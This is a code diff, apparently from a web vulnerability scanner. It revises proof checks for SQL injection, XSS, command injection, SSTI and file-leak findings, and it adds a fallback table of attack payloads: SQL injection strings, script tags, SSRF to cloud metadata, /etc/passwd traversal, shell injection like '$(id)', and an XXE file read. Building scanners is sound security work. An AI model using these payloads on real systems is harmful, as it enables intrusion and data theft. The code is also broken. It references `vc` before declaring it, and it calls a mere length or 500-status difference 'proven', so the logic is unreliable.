@@ -1684,34 +1684,51 @@ Return via the tool. Each chain step must have a specific URL path, parameter, a
         headers: vf.mutated.headers || {},
       };
 
-      // Run deterministic proof checks inline
+      // Run deterministic proof checks inline — compare MUTATED to BASELINE (fix #2)
       let proven = false;
       let proofType = "unsupported";
       let details = "No deterministic proof available";
       let mathBasis = "N/A";
 
+      const mb = vf.mutated.bodySnippet || "";
+      const bb = vf.baseline.bodySnippet || "";
+      const mbLen = vf.mutated.length || mb.length;
+      const bbLen = vf.baseline.length || bb.length;
+      const lenDiff = Math.abs(mbLen - bbLen);
+      const lenDiffPct = lenDiff / (bbLen || 1);
+
       if (vf.vulnClass === "sqli" || vf.vulnClass === "auth-bypass") {
-        const sqlErrors = [/sql syntax/i, /ORA-\d+/i, /SQLSTATE/i, /pg_query/i, /unclosed quotation/i];
-        if (sqlErrors.some(p => p.test(vf.mutated.bodySnippet || "") && !p.test(vf.baseline.bodySnippet || ""))) {
-          proven = true; proofType = "error_based"; mathBasis = "DB error string in mutated response only";
+        const sqlErrors = [/sql syntax/i, /ORA-\d+/i, /SQLSTATE/i, /pg_query/i, /unclosed quotation/i, /odbc.*error/i, /microsoft.*sql/i];
+        if (sqlErrors.some(p => p.test(mb) && !p.test(bb))) {
+          proven = true; proofType = "error_based"; mathBasis = "DB error string in mutated only (not in baseline)";
+        } else if (vf.mutated.status >= 500 && vf.baseline.status < 500) {
+          proven = true; proofType = "server_500_differential"; mathBasis = `Mutated returned ${vf.mutated.status} vs baseline ${vf.baseline.status}`;
+        } else if (lenDiffPct > 0.15 && lenDiff > 200 && vf.mutated.status === 200) {
+          proven = true; proofType = "boolean_differential"; mathBasis = `Body length differential: ${bbLen}b → ${mbLen}b (Δ${Math.round(lenDiffPct*100)}%)`;
         }
       } else if (vf.vulnClass === "rxss" || vf.vulnClass === "stored-xss") {
         const probes = ["<cyberscope>", "<svg onload=", "onerror=cyberscope"];
-        if (probes.some(p => (vf.mutated.bodySnippet || "").includes(p))) {
-          proven = true; proofType = "xss_reflection"; mathBasis = "Probe reflected unescaped";
+        if (probes.some(p => mb.includes(p) && !bb.includes(p))) {
+          proven = true; proofType = "xss_reflection"; mathBasis = "Probe reflected unescaped in mutated only";
         }
       } else if (vf.vulnClass === "cmdi") {
-        if (/cyberscope_marker|uid=\d+\(|root:.*:0:0/.test(vf.mutated.bodySnippet || "")) {
-          proven = true; proofType = "cmd_output"; mathBasis = "Command execution marker found";
+        if (/cyberscope_marker|uid=\d+\(|root:.*:0:0/.test(mb) && !/cyberscope_marker|uid=\d+\(|root:.*:0:0/.test(bb)) {
+          proven = true; proofType = "cmd_output"; mathBasis = "Command execution marker in mutated only";
         }
       } else if (vf.vulnClass === "ssti") {
-        if (/\b49\b/.test(vf.mutated.bodySnippet || "") && !/\b49\b/.test(vf.baseline.bodySnippet || "")) {
+        if (/\b49\b/.test(mb) && !/\b49\b/.test(bb)) {
           proven = true; proofType = "template_eval"; mathBasis = "7*7=49 evaluated";
         }
       } else if (vf.vulnClass === "path-traversal" || vf.vulnClass === "lfi") {
-        if (/root:.*:0:0|\/bin\/bash/.test(vf.mutated.bodySnippet || "")) {
-          proven = true; proofType = "file_leak"; mathBasis = "System file content detected";
+        if (/root:.*:0:0|\/bin\/bash/.test(mb) && !/root:.*:0:0|\/bin\/bash/.test(bb)) {
+          proven = true; proofType = "file_leak"; mathBasis = "System file content in mutated only";
         }
+      }
+
+      // Generic fallback: 500-status differential on ANY vuln class = info disclosure
+      if (!proven && vf.mutated.status >= 500 && vf.baseline.status < 500) {
+        proven = true; proofType = "server_500_differential";
+        mathBasis = `Mutated ${vf.mutated.status} vs baseline ${vf.baseline.status} (payload-triggered server error)`;
       }
 
       if (!proven) details = `No deterministic proof for ${vf.vulnClass}`;
@@ -1802,7 +1819,26 @@ Return via the tool. Each chain step must have a specific URL path, parameter, a
           const templatePayloads = ((feed.test_template as any)?.payloads || []) as string[];
           const extractedPayloads = (feed.extracted_payloads as string[]) || [];
           const allPayloads = [...new Set([...templatePayloads, ...extractedPayloads])].slice(0, 5);
-          if (allPayloads.length === 0) continue;
+          // Fix #4 — if template has no payloads, synthesize 2-3 from vuln class instead of skipping
+          if (allPayloads.length === 0) {
+            const FALLBACK_PAYLOADS: Record<string, string[]> = {
+              sqli: ["' OR '1'='1'--", "1 AND SLEEP(5)", "1' UNION SELECT NULL--"],
+              rxss: ["<svg onload=alert(1)>", "\"><script>alert(1)</script>", "javascript:alert(1)"],
+              ssrf: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "file:///etc/passwd"],
+              ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
+              lfi: ["../../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd%00"],
+              "path-traversal": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
+              cmdi: ["; id", "| whoami", "`id`", "$(id)"],
+              xxe: ["<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>"],
+            };
+            const synth = FALLBACK_PAYLOADS[vc] || FALLBACK_PAYLOADS[(feed.vulnerability_class || "").toLowerCase()] || [];
+            if (synth.length > 0) {
+              allPayloads.push(...synth.slice(0, 3));
+              await log(db, targetId, taskId, "info", `🧬 Template "${feed.title}" had no payloads — synthesized ${synth.slice(0,3).length} ${vc} probes`);
+            } else {
+              continue;
+            }
+          }
 
           const vc = feed.vulnerability_class || "sqli";
           let confirmed = false;
